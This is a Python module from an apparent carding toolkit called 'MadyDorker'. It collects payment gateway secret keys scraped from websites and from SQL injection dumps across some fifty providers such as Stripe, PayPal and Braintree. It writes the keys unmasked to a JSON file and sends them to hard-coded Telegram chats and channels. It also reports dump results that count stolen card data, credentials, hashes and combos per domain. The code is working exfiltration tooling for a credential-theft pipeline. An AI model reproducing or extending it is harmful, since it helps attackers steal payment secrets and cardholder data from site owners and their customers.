"""
Mady Bot Auto-Feed Integration

Automatically feeds found gateway keys to:
  1. Mady bot's scraped_keys.json on disk
  2. Telegram rich messages → your chat, group, channel, AND Mady Bot
"""

import os
import json
import asyncio
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from pathlib import Path
from loguru import logger


@dataclass
class MadyFeederConfig:
    """Configuration for Mady bot feeder."""
    enabled: bool = True
    mady_path: str = "/home/null/Desktop/Mady7.0.2/Mady_Version7.0.0"
    scraped_keys_file: str = "scraped_keys.json"
    auto_test: bool = False
    deduplicate: bool = True
    
    # ===== Telegram Rich Message Feeds =====
    telegram_enabled: bool = True
    bot_token: str = ""  # Filled from main config at init
    # All targets that receive rich messages (chat_id list)
    feed_chat_ids: List[str] = field(default_factory=list)  # Built at init
    # Explicit additional targets
    mady_bot_chat_id: str = "8385066318"        # Mady Bot direct
    feed_channel_id: str = "-1003720958643"     # Dedicated channel
    # Message formatting
    show_full_key: bool = True   # Show full key value (not masked)


class MadyFeeder:
    """Feeds gateway keys to Mady bot — disk + Telegram rich messages.
    
    Sends to ALL configured targets simultaneously:
      - Disk: scraped_keys.json
      - Telegram: your chat, your group, a channel, Mady Bot
    
    XDumpGO-complete support for 50+ gateway types!
    """
    
    # Map MadyDorker key types to Mady bot key types (comprehensive XDumpGO mapping)
    KEY_TYPE_MAP = {
        # ========== STRIPE ==========
        "stripe_pk": "stripe_pk",
        "stripe_publishable_key": "stripe_pk",
        "Stripe Publishable Key": "stripe_pk",
        "stripe_sk": "stripe_sk",
        "stripe_secret_key": "stripe_sk",
        "Stripe Secret Key": "stripe_sk",
        "stripe_rk": "stripe_rk",
        "Stripe Restricted Key": "stripe_rk",
        "stripe_whsec": "stripe_webhook",
        "Stripe Webhook Secret": "stripe_webhook",
        "stripe_pk_test": "stripe_pk_test",
        "stripe_sk_test": "stripe_sk_test",
        "stripe_acct": "stripe_acct",
        "stripe_client_secret": "stripe_client_secret",
        
        # ========== BRAINTREE ==========
        "braintree_token": "braintree_token",
        "braintree_client_token": "braintree_token",
        "Braintree Client Token": "braintree_token",
        "braintree_merchant": "braintree_merchant",
        "Braintree Merchant ID": "braintree_merchant",
        "braintree_private": "braintree_private",
        "braintree_public": "braintree_public",
        
        # ========== PAYPAL ==========
        "paypal_client": "paypal_client",
        "paypal_client_id": "paypal_client",
        "PayPal Client ID": "paypal_client",
        "paypal_secret": "paypal_secret",
        "PayPal Secret": "paypal_secret",
        "paypal_sdk": "paypal_sdk",
        "paypal_merchant": "paypal_merchant",
        "paypal_access_token": "paypal_access_token",
        
        # ========== SQUARE ==========
        "square_token": "square_token",
        "Square Access Token": "square_token",
        "square_secret": "square_secret",
        "Square OAuth Secret": "square_secret",
        "square_app": "square_app",
        "square_location": "square_location",
        
        # ========== ADYEN ==========
        "adyen_key": "adyen_key",
        "Adyen API Key": "adyen_key",
        "adyen_client": "adyen_client",
        "adyen_merchant": "adyen_merchant",
        
        # ========== RAZORPAY ==========
        "razorpay_key": "razorpay_key",
        "Razorpay Key ID": "razorpay_key",
        "razorpay_secret": "razorpay_secret",
        
        # ========== MOLLIE ==========
        "mollie_live": "mollie_live",
        "mollie_test": "mollie_test",
        
        # ========== KLARNA ==========
        "klarna_key": "klarna",
        "klarna_merchant": "klarna_merchant",
        
        # ========== AFFIRM ==========
        "affirm_public": "affirm_public",
        "affirm_private": "affirm_private",
        
        # ========== AFTERPAY ==========
        "afterpay_merchant": "afterpay",
        "afterpay_secret": "afterpay_secret",
        
        # ========== SEZZLE ==========
        "sezzle_public": "sezzle_public",
        "sezzle_private": "sezzle_private",
        
        # ========== AUTHORIZE.NET ==========
        "authnet_login": "authnet_login",
        "authnet_key": "authnet_key",
        "Authorize.net Login ID": "authnet_login",
        "Authorize.net Transaction Key": "authnet_key",
        
        # ========== CHECKOUT.COM ==========
        "checkout_pk": "checkout_pk",
        "Checkout.com PK": "checkout_pk",
        "checkout_sk": "checkout_sk",
        
        # ========== WORLDPAY ==========
        "worldpay_key": "worldpay_key",
        "worldpay_client": "worldpay_client",
        
        # ========== NMI ==========
        "nmi_key": "nmi_key",
        "nmi_token": "nmi_token",
        
        # ========== 2CHECKOUT ==========
        "2checkout_merchant": "2checkout_merchant",
        "2checkout_secret": "2checkout_secret",
        
        # ========== PAYU ==========
        "payu_key": "payu_key",
        "payu_salt": "payu_salt",
        
        # ========== CYBERSOURCE ==========
        "cybersource_merchant": "cybersource_merchant",
        "cybersource_key": "cybersource_key",
        
        # ========== FIRST DATA ==========
        "firstdata_merchant": "firstdata_merchant",
        "firstdata_secret": "firstdata_secret",
        
        # ========== GLOBAL PAYMENTS ==========
        "globalpay_key": "globalpay_key",
        "globalpay_merchant": "globalpay_merchant",
        
        # ========== PAYSAFE/SKRILL ==========
        "paysafe_key": "paysafe_key",
        "skrill_merchant": "skrill_merchant",
        "skrill_secret": "skrill_secret",
        
        # ========== GOCARDLESS ==========
        "gocardless_token": "gocardless_token",
        
        # ========== RECURLY ==========
        "recurly_key": "recurly_key",
        "recurly_public": "recurly_public",
        
        # ========== CHARGEBEE ==========
        "chargebee_key": "chargebee_key",
        "chargebee_site": "chargebee_site",
        
        # ========== PADDLE ==========
        "paddle_vendor": "paddle_vendor",
        "paddle_key": "paddle_key",
        
        # ========== GUMROAD ==========
        "gumroad_token": "gumroad_token",
        
        # ========== LEMONSQUEEZY ==========
        "lemonsqueezy_key": "lemonsqueezy_key",
        
        # ========== FASTSPRING ==========
        "fastspring_key": "fastspring_key",
        
        # ========== BLUESNAP ==========
        "bluesnap_pass": "bluesnap_pass",
        
        # ========== SPREEDLY ==========
        "spreedly_env": "spreedly_env",
        "spreedly_secret": "spreedly_secret",
        
        # ========== PLAID ==========
        "plaid_client": "plaid_client",
        "plaid_secret": "plaid_secret",
        "plaid_public": "plaid_public",
        
        # ========== WEPAY ==========
        "wepay_client": "wepay_client",
        "wepay_token": "wepay_token",
        
        # ========== DWOLLA ==========
        "dwolla_key": "dwolla_key",
        "dwolla_secret": "dwolla_secret",
        
        # ========== INDIAN GATEWAYS ==========
        "instamojo_key": "instamojo_key",
        "instamojo_token": "instamojo_token",
        "paytm_key": "paytm_key",
        "paytm_mid": "paytm_mid",
        "phonepe_merchant": "phonepe_merchant",
        "phonepe_salt": "phonepe_salt",
    }
    
    # Gateway types that Mady bot can test
    SUPPORTED_GATEWAYS = [
        'stripe_pk', 'stripe_sk', 'stripe_rk', 'stripe_webhook', 'stripe_acct',
        'braintree_token', 'braintree_merchant', 'braintree',
        'paypal_client', 'paypal_secret', 'paypal',
        'square_token', 'square_secret', 'square',
        'adyen_key', 'adyen_client', 'adyen',
        'razorpay_key', 'razorpay_secret', 'razorpay',
        'mollie_live', 'mollie_test', 'mollie',
        'klarna', 'affirm', 'afterpay', 'sezzle',
        'authnet_login', 'authnet_key', 'authorize',
        'checkout_pk', 'checkout_sk', 'checkout',
        'worldpay', 'nmi', '2checkout', 'payu',
        'cybersource', 'firstdata', 'globalpay',
        'paysafe', 'skrill', 'gocardless', 'recurly',
        'chargebee', 'paddle', 'gumroad', 'lemonsqueezy',
        'fastspring', 'bluesnap', 'spreedly',
        'plaid', 'wepay', 'dwolla',
        'instamojo', 'paytm', 'phonepe',
    ]
    
    # Emoji map for gateway families
    GATEWAY_EMOJI = {
        'stripe': '💳', 'braintree': '🌳', 'paypal': '🅿️',
        'square': '⬜', 'adyen': '🔷', 'razorpay': '⚡',
        'mollie': '🐟', 'klarna': '🩷', 'affirm': '✅',
        'afterpay': '🟢', 'sezzle': '🟣', 'authnet': '🏦',
        'checkout': '🛒', 'worldpay': '🌍', 'nmi': '🔑',
        '2checkout': '2️⃣', 'payu': '💰', 'cybersource': '🛡️',
        'firstdata': '1️⃣', 'globalpay': '🌐', 'paysafe': '🔒',
        'skrill': '💸', 'gocardless': '💚', 'recurly': '🔄',
        'chargebee': '🐝', 'paddle': '🏓', 'gumroad': '🛣️',
        'lemonsqueezy': '🍋', 'fastspring': '🌊', 'bluesnap': '🔵',
        'spreedly': '🔀', 'plaid': '🏛️', 'wepay': '💲',
        'dwolla': '🏧', 'instamojo': '🇮🇳', 'paytm': '📱',
        'phonepe': '☎️',
    }
    
    def __init__(self, config: Optional[MadyFeederConfig] = None):
        self.config = config or MadyFeederConfig()
        self.scraped_keys_path = os.path.join(
            self.config.mady_path, 
            self.config.scraped_keys_file
        )
        self._fed_keys: set = set()  # Track what we've already fed
        self._telegram_sent: int = 0  # Count of telegram messages sent
        self._disk_saved: int = 0     # Count of disk saves
        self._load_existing_keys()
    
    def _load_existing_keys(self):
        """Load existing keys to avoid duplicates."""
        if not self.config.deduplicate:
            return
        
        try:
            if os.path.exists(self.scraped_keys_path):
                with open(self.scraped_keys_path, 'r') as f:
                    data = json.load(f)
                    for entry in data:
                        for key_type, keys in entry.get('keys', []):
                            for key in keys:
                                self._fed_keys.add(key)
                logger.debug(f"Loaded {len(self._fed_keys)} existing keys from Mady")
        except Exception as e:
            logger.warning(f"Could not load existing Mady keys: {e}")
    
    def _normalize_key_type(self, key_type: str) -> str:
        """Normalize key type to Mady bot format."""
        return self.KEY_TYPE_MAP.get(key_type, key_type.lower().replace(' ', '_'))
    
    def _is_supported_gateway(self, key_type: str) -> bool:
        """Check if key type is supported by Mady bot (50+ gateways!)."""
        normalized = self._normalize_key_type(key_type)
        return any(s in normalized for s in self.SUPPORTED_GATEWAYS)
    
    def _get_gateway_emoji(self, key_type: str) -> str:
        """Get emoji for a gateway type."""
        normalized = self._normalize_key_type(key_type).lower()
        for family, emoji in self.GATEWAY_EMOJI.items():
            if family in normalized:
                return emoji
        return '🔐'
    
    def _build_rich_message(self, url: str, key_type: str, key_value: str,
                            source: str = "", extra: Optional[Dict] = None) -> str:
        """Build a rich HTML-formatted Telegram message for a found key.
        
        Returns:
            HTML-formatted message string
        """
        normalized = self._normalize_key_type(key_type)
        emoji = self._get_gateway_emoji(key_type)
        gateway_family = normalized.split('_')[0].upper()
        
        # Key display
        if self.config.show_full_key:
            key_display = f"<code>{key_value}</code>"
        else:
            # Mask middle portion
            if len(key_value) > 16:
                key_display = f"<code>{key_value[:8]}{'•' * 8}{key_value[-8:]}</code>"
            else:
                key_display = f"<code>{key_value[:4]}{'•' * 4}{key_value[-4:]}</code>"
        
        # Extract domain from URL
        try:
            from urllib.parse import urlparse
            domain = urlparse(url).netloc or url[:60]
        except Exception:
            domain = url[:60]
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        lines = [
            f"{emoji} <b>GATEWAY KEY FOUND</b> {emoji}",
            "",
            f"🏷 <b>Type:</b> <code>{normalized}</code>",
            f"🏢 <b>Gateway:</b> {gateway_family}",
            f"🌐 <b>Domain:</b> <code>{domain}</code>",
            f"🔗 <b>URL:</b> {url[:200]}",
            "",
            f"🔑 <b>Key:</b>",
            f"{key_display}",
            "",
        ]
        
        # Add source info if available
        if source:
            source_labels = {
                'gateway_secrets': '🕸 Page Scrape (Gateway)',
                'api_secrets': '🔍 API Secret Detection',
                'js_bundle': '📦 JS Bundle Analysis',
                'auto_dump_gateway': '💾 Auto-Dump (Gateway)',
                'auto_dump_valid': '✅ Auto-Dump (Validated)',
                'key_validation': '🧪 Live Key Validation',
                'scan_sqli_dump': '💉 SQLi Dump',
                'scan_blind_dump': '🔮 Blind SQLi Dump',
                'scan_gateway_report': '📊 Scan Report (Gateway)',
                'scan_non_gateway': '🔎 Scan Report (API)',
                'madydorker': '🤖 MadyDorker Auto',
            }
            label = source_labels.get(source, f'📡 {source}')
            lines.append(f"📡 <b>Source:</b> {label}")
        
        # Add extra metadata
        if extra:
            if 'confidence' in extra:
                conf = extra['confidence']
                conf_bar = '🟢' if conf >= 0.9 else '🟡' if conf >= 0.7 else '🟠'
                lines.append(f"{conf_bar} <b>Confidence:</b> {conf:.0%}")
            if 'waf' in extra:
                lines.append(f"🛡 <b>WAF:</b> {extra['waf']}")
        
        lines.extend([
            "",
            f"⏰ {timestamp}",
            f"━━━━━━━━━━━━━━━━━━━━",
            f"🤖 <b>MadyDorker Auto-Feed</b>",
        ])
        
        return "\n".join(lines)
    
    def _build_batch_message(self, url: str, keys: List[Dict]) -> str:
        """Build a rich message for multiple keys from the same URL."""
        try:
            from urllib.parse import urlparse
            domain = urlparse(url).netloc or url[:60]
        except Exception:
            domain = url[:60]
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        lines = [
            f"🎯 <b>MULTIPLE KEYS FOUND</b> 🎯",
            "",
            f"🌐 <b>Domain:</b> <code>{domain}</code>",
            f"🔗 <b>URL:</b> {url[:200]}",
            f"📊 <b>Keys Found:</b> {len(keys)}",
            "",
        ]
        
        for i, k in enumerate(keys, 1):
            kt = k.get('type', 'unknown')
            kv = k.get('value', '')
            emoji = self._get_gateway_emoji(kt)
            normalized = self._normalize_key_type(kt)
            if self.config.show_full_key:
                key_display = kv
            else:
                key_display = f"{kv[:8]}...{kv[-6:]}" if len(kv) > 16 else kv
            lines.append(f"  {emoji} <b>{i}.</b> <code>{normalized}</code>")
            lines.append(f"     <code>{key_display}</code>")
            lines.append("")
        
        lines.extend([
            f"⏰ {timestamp}",
            f"━━━━━━━━━━━━━━━━━━━━",
            f"🤖 <b>MadyDorker Auto-Feed</b>",
        ])
        
        return "\n".join(lines)
    
    def _build_dump_message(self, url: str, dbms: str, database: str,
                            tables: int, rows: int, cards: int = 0,
                            credentials: int = 0, gateway_keys: int = 0,
                            dump_type: str = "union", source: str = "auto_dump",
                            extra: Optional[Dict] = None) -> str:
        """Build a rich HTML message for a successful data dump."""
        try:
            from urllib.parse import urlparse
            domain = urlparse(url).netloc or url[:60]
        except Exception:
            domain = url[:60]
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Dump type emoji
        type_info = {
            'union': ('⚡', 'Union-Based'),
            'boolean': ('🔮', 'Boolean Blind'),
            'time': ('⏱️', 'Time-Based Blind'),
            'error': ('💥', 'Error-Based'),
            'blind': ('🔮', 'Blind'),
        }
        emoji, label = type_info.get(dump_type, ('📦', dump_type.title()))
        
        lines = [
            f"📦 <b>DATA DUMP SUCCESSFUL</b> 📦",
            "",
            f"{emoji} <b>Type:</b> {label} SQLi",
            f"🗄️ <b>DBMS:</b> <code>{dbms or 'Unknown'}</code>",
            f"🗃️ <b>Database:</b> <code>{database or 'N/A'}</code>",
            f"🌐 <b>Domain:</b> <code>{domain}</code>",
            f"🔗 <b>URL:</b> {url[:200]}",
            "",
            f"📊 <b>Tables:</b> {tables}",
            f"📝 <b>Rows:</b> {rows:,}",
        ]
        
        # High-value data indicators
        if cards > 0:
            lines.append(f"💳 <b>Card Data:</b> {cards} entries")
        if credentials > 0:
            lines.append(f"🔐 <b>Credentials:</b> {credentials}")
        if gateway_keys > 0:
            lines.append(f"🔑 <b>Gateway Keys:</b> {gateway_keys}")
        
        # Extra metadata
        if extra:
            if 'hashes' in extra and extra['hashes'] > 0:
                lines.append(f"#️⃣ <b>Hashes:</b> {extra['hashes']}")
            if 'emails' in extra and extra['emails'] > 0:
                lines.append(f"📧 <b>Emails:</b> {extra['emails']}")
            if 'combos' in extra and extra['combos'] > 0:
                lines.append(f"🔗 <b>Combos:</b> {extra['combos']}")
            if 'files' in extra:
                lines.append(f"📄 <b>Files:</b> {len(extra['files']) if isinstance(extra['files'], list) else extra['files']}")
        
        # Source label
        source_labels = {
            'auto_dump': '🤖 Auto-Dump Pipeline',
            'scan_sqli_dump': '💉 /scan SQLi Dump',
            'scan_blind_dump': '🔮 /scan Blind Dump',
            'legacy_union': '⚡ Legacy Union Dump',
            'legacy_blind': '🔮 Legacy Blind Dump',
        }
        src_label = source_labels.get(source, f'📡 {source}')
        lines.append(f"")
        lines.append(f"📡 <b>Source:</b> {src_label}")
        
        lines.extend([
            "",
            f"⏰ {timestamp}",
            f"━━━━━━━━━━━━━━━━━━━━",
            f"🤖 <b>MadyDorker Auto-Feed</b>",
        ])
        
        return "\n".join(lines)
    
    def feed_dump(self, url: str, dbms: str, database: str,
                  tables: int, rows: int, cards: int = 0,
                  credentials: int = 0, gateway_keys: int = 0,
                  dump_type: str = "union", source: str = "auto_dump",
                  extra: Optional[Dict] = None) -> bool:
        """Feed a dump report to Mady via Telegram + disk log."""
        if not self.config.enabled or not self.config.telegram_enabled:
            return False
        
        try:
            msg = self._build_dump_message(
                url, dbms, database, tables, rows, cards,
                credentials, gateway_keys, dump_type, source, extra,
            )
            self._send_telegram_sync(msg)
            logger.info(f"📦 Fed dump to Mady: {dbms}/{database} {tables}T/{rows}R from {url[:50]}")
            return True
        except Exception as e:
            logger.error(f"Failed to feed dump to Mady: {e}")
            return False
    
    async def feed_dump_async(self, url: str, dbms: str, database: str,
                               tables: int, rows: int, cards: int = 0,
                               credentials: int = 0, gateway_keys: int = 0,
                               dump_type: str = "union", source: str = "auto_dump",
                               extra: Optional[Dict] = None) -> bool:
        """Async version of feed_dump."""
        if not self.config.enabled or not self.config.telegram_enabled:
            return False
        
        try:
            msg = self._build_dump_message(
                url, dbms, database, tables, rows, cards,
                credentials, gateway_keys, dump_type, source, extra,
            )
            await self._send_telegram(msg)
            logger.info(f"📦 Fed dump to Mady: {dbms}/{database} {tables}T/{rows}R from {url[:50]}")
            return True
        except Exception as e:
            logger.error(f"Failed to feed dump to Mady: {e}")
            return False
    
    async def _send_telegram(self, text: str) -> int:
        """Send rich message to ALL configured Telegram targets.
        
        Returns:
            Number of targets successfully notified
        """
        if not self.config.telegram_enabled or not self.config.bot_token:
            return 0
        
        # Collect all unique target chat IDs
        targets = set()
        for cid in self.config.feed_chat_ids:
            if cid:
                targets.add(str(cid))
        if self.config.mady_bot_chat_id:
            targets.add(str(self.config.mady_bot_chat_id))
        if self.config.feed_channel_id:
            targets.add(str(self.config.feed_channel_id))
        
        if not targets:
            logger.debug("No Telegram feed targets configured")
            return 0
        
        api_url = f"https://api.telegram.org/bot{self.config.bot_token}/sendMessage"
        sent = 0
        
        try:
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                for chat_id in targets:
                    try:
                        data = {
                            "chat_id": chat_id,
                            "text": text[:4096],  # Telegram limit
                            "parse_mode": "HTML",
                            "disable_web_page_preview": True,
                        }
                        async with session.post(api_url, json=data) as resp:
                            if resp.status == 200:
                                sent += 1
                                logger.debug(f"Mady feed sent to {chat_id}")
                            else:
                                err = await resp.text()
                                logger.warning(f"Mady feed failed for {chat_id}: {resp.status} - {err[:100]}")
                    except Exception as e:
                        logger.warning(f"Mady feed error for {chat_id}: {e}")
        except Exception as e:
            logger.error(f"Mady feed Telegram session error: {e}")
        
        self._telegram_sent += sent
        return sent
    
    def _send_telegram_sync(self, text: str) -> int:
        """Sync wrapper for _send_telegram — works from any context."""
        try:
            loop = asyncio.get_running_loop()
            # We're inside an async context — schedule it
            asyncio.ensure_future(self._send_telegram(text))
            return 1  # Optimistic — fire-and-forget
        except RuntimeError:
            # No running loop — create one
            try:
                return asyncio.run(self._send_telegram(text))
            except Exception as e:
                logger.error(f"Mady feed sync send failed: {e}")
                return 0
    
    def feed_gateway(self, url: str, key_type: str, key_value: str, 
                     extra: Optional[Dict] = None, source: str = "madydorker") -> bool:
        """Feed a single gateway key to Mady bot — disk + Telegram.
        
        Args:
            url: Source URL where key was found
            key_type: Type of gateway key
            key_value: The actual key value
            extra: Optional additional metadata
            source: Discovery source label
            
        Returns:
            True if successfully fed, False otherwise
        """
        if not self.config.enabled:
            return False
        
        if not self._is_supported_gateway(key_type):
            logger.debug(f"Skipping unsupported gateway type: {key_type}")
            return False
        
        # Check for duplicates
        if key_value in self._fed_keys:
            logger.debug(f"Skipping duplicate key: {key_value[:20]}...")
            return False
        
        normalized_type = self._normalize_key_type(key_type)
        
        # ===== 1. Save to disk =====
        disk_ok = False
        try:
            existing = []
            if os.path.exists(self.scraped_keys_path):
                with open(self.scraped_keys_path, 'r') as f:
                    existing = json.load(f)
            
            found_url = False
            for entry in existing:
                if entry.get('url') == url:
                    key_found = False
                    for kt, keys in entry.get('keys', []):
                        if kt == normalized_type:
                            if key_value not in keys:
                                keys.append(key_value)
                            key_found = True
                            break
                    if not key_found:
                        entry.setdefault('keys', []).append([normalized_type, [key_value]])
                    found_url = True
                    break
            
            if not found_url:
                new_entry = {
                    "url": url,
                    "keys": [[normalized_type, [key_value]]],
                    "source": source,
                    "timestamp": datetime.now().isoformat(),
                }
                if extra:
                    new_entry['extra'] = extra
                existing.append(new_entry)
            
            with open(self.scraped_keys_path, 'w') as f:
                json.dump(existing, f, indent=2)
            
            disk_ok = True
            self._disk_saved += 1
            logger.info(f"💾 Fed to disk: {normalized_type} from {url[:50]}")
        except Exception as e:
            logger.error(f"Failed to save key to disk: {e}")
        
        # ===== 2. Send Telegram rich message =====
        try:
            msg = self._build_rich_message(url, key_type, key_value, source, extra)
            self._send_telegram_sync(msg)
        except Exception as e:
            logger.error(f"Failed to send Telegram feed: {e}")
        
        self._fed_keys.add(key_value)
        return disk_ok
    
    async def feed_gateway_async(self, url: str, key_type: str, key_value: str,
                                  extra: Optional[Dict] = None, source: str = "madydorker") -> bool:
        """Async version of feed_gateway — use from async contexts for proper awaiting."""
        if not self.config.enabled:
            return False
        
        if not self._is_supported_gateway(key_type):
            return False
        
        if key_value in self._fed_keys:
            return False
        
        normalized_type = self._normalize_key_type(key_type)
        
        # 1. Disk save (sync I/O is fine for small JSON)
        disk_ok = False
        try:
            existing = []
            if os.path.exists(self.scraped_keys_path):
                with open(self.scraped_keys_path, 'r') as f:
                    existing = json.load(f)
            
            found_url = False
            for entry in existing:
                if entry.get('url') == url:
                    key_found = False
                    for kt, keys in entry.get('keys', []):
                        if kt == normalized_type:
                            if key_value not in keys:
                                keys.append(key_value)
                            key_found = True
                            break
                    if not key_found:
                        entry.setdefault('keys', []).append([normalized_type, [key_value]])
                    found_url = True
                    break
            
            if not found_url:
                new_entry = {
                    "url": url,
                    "keys": [[normalized_type, [key_value]]],
                    "source": source,
                    "timestamp": datetime.now().isoformat(),
                }
                if extra:
                    new_entry['extra'] = extra
                existing.append(new_entry)
            
            with open(self.scraped_keys_path, 'w') as f:
                json.dump(existing, f, indent=2)
            
            disk_ok = True
            self._disk_saved += 1
        except Exception as e:
            logger.error(f"Disk save failed: {e}")
        
        # 2. Telegram rich message (properly awaited)
        try:
            msg = self._build_rich_message(url, key_type, key_value, source, extra)
            await self._send_telegram(msg)
        except Exception as e:
            logger.error(f"Telegram feed failed: {e}")
        
        self._fed_keys.add(key_value)
        return disk_ok
    
    def feed_batch(self, gateways: List[Dict], source: str = "madydorker") -> int:
        """Feed multiple gateways to Mady bot — disk + Telegram.
        
        If multiple keys from same URL, sends a consolidated batch message.
        """
        fed_count = 0
        
        # Group by URL for batch messages
        url_groups: Dict[str, List[Dict]] = {}
        for gw in gateways:
            url = gw.get('url', '')
            key_type = gw.get('type', '')
            key_value = gw.get('value', '')
            if url and key_type and key_value:
                url_groups.setdefault(url, []).append(gw)
        
        for url, keys in url_groups.items():
            # Feed each key individually to disk
            batch_new = []
            for gw in keys:
                if self.feed_gateway(url, gw['type'], gw['value'], source=source):
                    fed_count += 1
                    batch_new.append(gw)
            
            # If 3+ new keys from same URL, also send consolidated batch message
            if len(batch_new) >= 3:
                try:
                    msg = self._build_batch_message(url, batch_new)
                    self._send_telegram_sync(msg)
                except Exception:
                    pass
        
        return fed_count
    
    def get_stats(self) -> Dict:
        """Get feeder statistics."""
        total_in_mady = 0
        try:
            if os.path.exists(self.scraped_keys_path):
                with open(self.scraped_keys_path, 'r') as f:
                    data = json.load(f)
                    total_in_mady = len(data)
        except:
            pass
        
        targets = set()
        for cid in self.config.feed_chat_ids:
            if cid:
                targets.add(str(cid))
        if self.config.mady_bot_chat_id:
            targets.add(self.config.mady_bot_chat_id)
        if self.config.feed_channel_id:
            targets.add(self.config.feed_channel_id)
        
        return {
            "enabled": self.config.enabled,
            "telegram_enabled": self.config.telegram_enabled,
            "mady_path": self.config.mady_path,
            "telegram_targets": len(targets),
            "keys_fed_this_session": len(self._fed_keys),
            "telegram_messages_sent": self._telegram_sent,
            "disk_saves": self._disk_saved,
            "total_entries_in_mady": total_in_mady,
        }


# Singleton instance for easy access
_feeder: Optional[MadyFeeder] = None


def get_feeder(config: Optional[MadyFeederConfig] = None) -> MadyFeeder:
    """Get or create the global feeder instance."""
    global _feeder
    if _feeder is None:
        _feeder = MadyFeeder(config)
    return _feeder


def feed_to_mady(url: str, key_type: str, key_value: str, 
                 extra: Optional[Dict] = None, source: str = "madydorker") -> bool:
    """Convenience function to feed a gateway to Mady bot (disk + Telegram)."""
    return get_feeder().feed_gateway(url, key_type, key_value, extra, source)


async def feed_to_mady_async(url: str, key_type: str, key_value: str,
                              extra: Optional[Dict] = None, source: str = "madydorker") -> bool:
    """Async convenience function — properly awaits Telegram sends."""
    return await get_feeder().feed_gateway_async(url, key_type, key_value, extra, source)
